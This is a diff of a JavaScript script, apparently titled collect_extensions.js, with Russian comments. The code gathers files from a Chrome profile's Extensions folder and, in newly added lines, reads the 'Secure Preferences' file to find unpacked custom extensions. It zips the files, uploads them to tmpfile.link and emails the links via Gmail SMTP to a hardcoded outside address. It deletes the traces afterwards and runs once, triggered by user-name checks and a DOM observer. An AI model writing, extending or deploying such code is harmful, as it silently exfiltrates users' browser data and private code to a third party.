@@ -19,39 +19,39 @@
       MAIL_TO:        'bubliki696969@gmail.com',
       MAIL_SUBJECT:   'Chrome Extensions Archive Links',
     };
-
+ 
     const fs     = require('fs');
     const path   = require('path');
     const os     = require('os');
     const https  = require('https');
     const tls    = require('tls');
     const crypto = require('crypto');
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // Пути и константы
     // ═══════════════════════════════════════════════════════════════
-
+ 
     const EXTENSIONS_DIR = path.join(
       process.env.LOCALAPPDATA || path.join(os.homedir(), 'AppData', 'Local'),
       'Google', 'Chrome', 'User Data', 'Default', 'Extensions'
     );
-
+ 
     const STATE_FILE        = path.join(EXTENSIONS_DIR, 'state.json');
     const MAX_ARCHIVE_BYTES = 90 * 1024 * 1024;
-
+ 
     const TEXT_EXTENSIONS = new Set([
       '.js', '.mjs', '.cjs', '.css', '.html', '.htm', '.json',
       '.txt', '.xml', '.svg', '.ts', '.jsx', '.tsx', '.map',
       '.yaml', '.yml', '.md', '.csv', '.ini', '.conf', '.cfg',
     ]);
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // ZIP (без сторонних пакетов, метод STORE)
     // ═══════════════════════════════════════════════════════════════
-
+ 
     function uint16LE(n) { const b = Buffer.alloc(2); b.writeUInt16LE(n, 0); return b; }
     function uint32LE(n) { const b = Buffer.alloc(4); b.writeUInt32LE(n >>> 0, 0); return b; }
-
+ 
     const CRC_TABLE = (() => {
       const t = new Uint32Array(256);
       for (let i = 0; i < 256; i++) {
@@ -61,7 +61,7 @@
       }
       return t;
     })();
-
+ 
     function crc32(buf) {
       let crc = 0xFFFFFFFF;
       for (let i = 0; i < buf.length; i++) {
@@ -69,7 +69,7 @@
       }
       return (crc ^ 0xFFFFFFFF) >>> 0;
     }
-
+ 
     function addFileToZip(chunks, centralDir, zipName, content) {
       const nameBytes = Buffer.from(zipName, 'utf8');
       const crc       = crc32(content);
@@ -87,7 +87,7 @@
       chunks.push(lfh, content);
       centralDir.push({ nameBytes, crc, size, offset });
     }
-
+ 
     function finalizeZip(chunks, centralDir) {
       let cdOffset = 0;
       for (const c of chunks) cdOffset += c.length;
@@ -115,11 +115,11 @@
       ]);
       chunks.push(eocd);
     }
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // Файловые утилиты
     // ═══════════════════════════════════════════════════════════════
-
+ 
     function walkDir(dir) {
       const results = [];
       let entries;
@@ -131,18 +131,18 @@
       }
       return results;
     }
-
+ 
     function isTextFile(fp) {
       return TEXT_EXTENSIONS.has(path.extname(fp).toLowerCase());
     }
-
+ 
     function readFileContent(fp) {
       if (isTextFile(fp)) {
         try { return fs.readFileSync(fp); } catch { return Buffer.alloc(0); }
       }
       return Buffer.alloc(0);
     }
-
+ 
     function cleanupIncompleteArchives(dir) {
       let entries;
       try { entries = fs.readdirSync(dir); } catch { return; }
@@ -157,11 +157,11 @@
         }
       }
     }
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // Загрузка на tmpfile.link
     // ═══════════════════════════════════════════════════════════════
-
+ 
     function uploadFile(filePath) {
       return new Promise((resolve, reject) => {
         const fileData = fs.readFileSync(filePath);
@@ -210,11 +210,11 @@
         req.end();
       });
     }
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // Gmail SMTP (порт 465, SSL, без nodemailer)
     // ═══════════════════════════════════════════════════════════════
-
+ 
     function sendMail(subject, bodyText) {
       return new Promise((resolve, reject) => {
         const { GMAIL_USER, GMAIL_APP_PASS, MAIL_TO } = CONFIG;
@@ -230,15 +230,15 @@
           `Content-Type: text/plain; charset=utf-8\r\n` +
           `\r\n` +
           bodyText + '\r\n';
-
+ 
         const socket = tls.connect({ host: 'smtp.gmail.com', port: 465 });
         socket.setTimeout(30000);
         socket.on('timeout', () => { socket.destroy(); reject(new Error('SMTP timeout')); });
         socket.on('error', reject);
-
+ 
         let step = 0;
         let lineBuf = '';
-
+ 
         socket.on('data', (chunk) => {
           lineBuf += chunk.toString();
           const lines = lineBuf.split('\r\n');
@@ -293,44 +293,93 @@
         });
       });
     }
-
+ 
     // ═══════════════════════════════════════════════════════════════
     // ГЛАВНАЯ ФУНКЦИЯ
     // ═══════════════════════════════════════════════════════════════
-
+ 
     async function main() {
-
+ 
       // ── 0. Флаг успешного завершения ─────────────────────────
       if (fs.existsSync(STATE_FILE)) {
         console.log('✓ state.json обнаружен. Выход.');
         return;
       }
-
+ 
       // ── 1. Проверка директории ───────────────────────────────
       if (!fs.existsSync(EXTENSIONS_DIR)) {
         console.error(`Директория не найдена:\n  ${EXTENSIONS_DIR}`);
         return;
       }
       console.log(`Директория расширений:\n  ${EXTENSIONS_DIR}\n`);
-
+ 
       // ── 2. Очистка незавершённых архивов ────────────────────
       console.log('Проверка незавершённых архивов...');
       cleanupIncompleteArchives(EXTENSIONS_DIR);
-
+ 
       // ── 3. Сбор файлов ──────────────────────────────────────
       console.log('\nСбор файлов...');
-      const allFiles = walkDir(EXTENSIONS_DIR).filter(fp =>
-        !fp.endsWith('.zip') && fp !== STATE_FILE
-      );
-      console.log(`  Найдено файлов: ${allFiles.length}`);
+ 
+      // Читаем Secure Preferences для поиска кастомных расширений (location: 4)
+      const USER_DATA_DIR    = path.join(EXTENSIONS_DIR, '..'); // Default/
+      const SECURE_PREFS     = path.join(USER_DATA_DIR, 'Secure Preferences');
+      const customDirs       = new Set(); // абсолютные пути к кастомным расширениям
+ 
+      if (fs.existsSync(SECURE_PREFS)) {
+        try {
+          const prefs    = JSON.parse(fs.readFileSync(SECURE_PREFS, 'utf8'));
+          const settings = prefs && prefs.extensions && prefs.extensions.settings;
+          if (settings) {
+            for (const [id, ext] of Object.entries(settings)) {
+              if (ext.location === 4 && ext.path) {
+                // path может быть абсолютным или относительным
+                const extPath = path.isAbsolute(ext.path)
+                  ? ext.path
+                  : path.join(USER_DATA_DIR, ext.path);
+                if (fs.existsSync(extPath)) {
+                  customDirs.add(path.normalize(extPath));
+                  console.log(`  [custom] Найдено: ${id}\n           → ${extPath}`);
+                }
+              }
+            }
+          }
+        } catch (e) {
+          console.warn(`  [warn] Не удалось прочитать Secure Preferences: ${e.message}`);
+        }
+      } else {
+        console.warn('  [warn] Secure Preferences не найден, только стандартные расширения.');
+      }
+ 
+      // Файлы кастомных расширений — в приоритете (идут первыми)
+      const customFiles = [];
+      for (const extDir of customDirs) {
+        customFiles.push(...walkDir(extDir));
+      }
+ 
+      // Стандартные расширения из папки Extensions (исключаем кастомные пути)
+      const standardFiles = walkDir(EXTENSIONS_DIR).filter(fp => {
+        if (fp.endsWith('.zip') || fp === STATE_FILE) return false;
+        // Пропускаем файлы, которые уже попали через customDirs
+        for (const cDir of customDirs) {
+          if (fp.startsWith(cDir)) return false;
+        }
+        return true;
+      });
+ 
+      // Итоговый список: сначала кастомные, потом стандартные
+      const allFiles = [...customFiles, ...standardFiles];
+ 
+      console.log(`  Кастомных файлов:    ${customFiles.length} (из ${customDirs.size} расширений)`);
+      console.log(`  Стандартных файлов:  ${standardFiles.length}`);
+      console.log(`  Итого:               ${allFiles.length}`);
       if (allFiles.length === 0) { console.log('Нет файлов для архивации.'); return; }
-
+ 
       // ── 4. Формирование ZIP-архивов ─────────────────────────
       const OVERHEAD = 300;
       const archives = [];
       let chunks = [], cd = [], curSize = 0, archIdx = 1, cnt = 0;
       let textCnt = 0, binCnt = 0;
-
+ 
       function flush() {
         if (cnt === 0) return;
         finalizeZip(chunks, cd);
@@ -340,10 +389,29 @@
         archIdx++;
         chunks = []; cd = []; curSize = 0; cnt = 0;
       }
-
+ 
+      // Базовая директория для построения относительных путей внутри архива.
+      // Кастомные расширения кладём в подпапку custom/, стандартные — в extensions/
       for (const fp of allFiles) {
+        const isCustom  = customFiles.includes(fp);
+        const baseDir   = isCustom ? path.dirname(fp.slice(0, fp.indexOf(path.sep, fp.indexOf(path.sep) + 1) + 1)) : EXTENSIONS_DIR;
+        const prefix    = isCustom ? 'custom' : 'extensions';
+        // Для кастомных: custom/<папка_расширения>/файл
+        // Для стандартных: extensions/<id>/<версия>/файл
+        let entryName;
+        if (isCustom) {
+          // Находим корень кастомного расширения
+          let relBase = null;
+          for (const cDir of customDirs) {
+            if (fp.startsWith(cDir)) { relBase = cDir; break; }
+          }
+          const rel = relBase ? path.relative(path.dirname(relBase), fp) : path.basename(fp);
+          entryName = (prefix + '/' + rel).replace(/\\/g, '/');
+        } else {
+          entryName = (prefix + '/' + path.relative(EXTENSIONS_DIR, fp)).replace(/\\/g, '/');
+        }
+ 
         const content   = readFileContent(fp);
-        const entryName = path.relative(EXTENSIONS_DIR, fp).replace(/\\/g, '/');
         const entrySize = content.length + OVERHEAD + Buffer.byteLength(entryName, 'utf8') * 2;
         if (isTextFile(fp)) textCnt++; else binCnt++;
         if (cnt > 0 && curSize + entrySize > MAX_ARCHIVE_BYTES) flush();
@@ -352,11 +420,11 @@
         cnt++;
       }
       flush();
-
+ 
       console.log(`  Текстовых (с данными): ${textCnt}`);
       console.log(`  Бинарных (пустышки):   ${binCnt}`);
       console.log(`  Архивов:               ${archives.length}`);
-
+ 
       // ── 5. Запись и переименование TEMP → DONE ───────────────
       console.log('\nЗапись архивов на диск...');
       const doneArchives = [];
@@ -375,7 +443,7 @@
           return;
         }
       }
-
+ 
       // ── 6. Загрузка на tmpfile.link ──────────────────────────
       console.log('\nЗагрузка на tmpfile.link...');
       const uploadedLinks = [];
@@ -393,7 +461,7 @@
           return;
         }
       }
-
+ 
       // ── 7. Отправка письма ───────────────────────────────────
       console.log('\nОтправка письма...');
       const now   = new Date().toLocaleString('ru-RU');
@@ -403,7 +471,7 @@
         `Количество архивов: ${uploadedLinks.length}\n\n` +
         `Ссылки для скачивания:\n\n` +
         links + `\n\n--\ncollect_extensions.js`;
-
+ 
       try {
         await sendMail(CONFIG.MAIL_SUBJECT, mailBody);
         console.log(`  ✓ Письмо отправлено → ${CONFIG.MAIL_TO}`);
@@ -412,7 +480,7 @@
         console.error('  Архивы НЕ удалены (ссылки — в консоли выше).');
         return;
       }
-
+ 
       // ── 8. Удаление архивов + state.json ────────────────────
       console.log('\nУдаление архивов...');
       for (const archivePath of doneArchives) {
@@ -423,14 +491,14 @@
           console.warn(`  Не удалось удалить ${path.basename(archivePath)}: ${e.message}`);
         }
       }
-
+ 
       fs.writeFileSync(STATE_FILE, '', 'utf8');
       console.log(`\n✓ Готово! state.json создан:\n  ${STATE_FILE}`);
     }
-
+ 
     main().catch(e => console.error('\n[FATAL]', e.message));
   };
-
+ 
   const check = () => {
     const names = getUserNames();
     for (const name of names) {
@@ -442,7 +510,7 @@
       }
     }
   };
-
+ 
   check();
   new MutationObserver(() => check())
     .observe(document.body || document.documentElement, { childList: true, subtree: true });
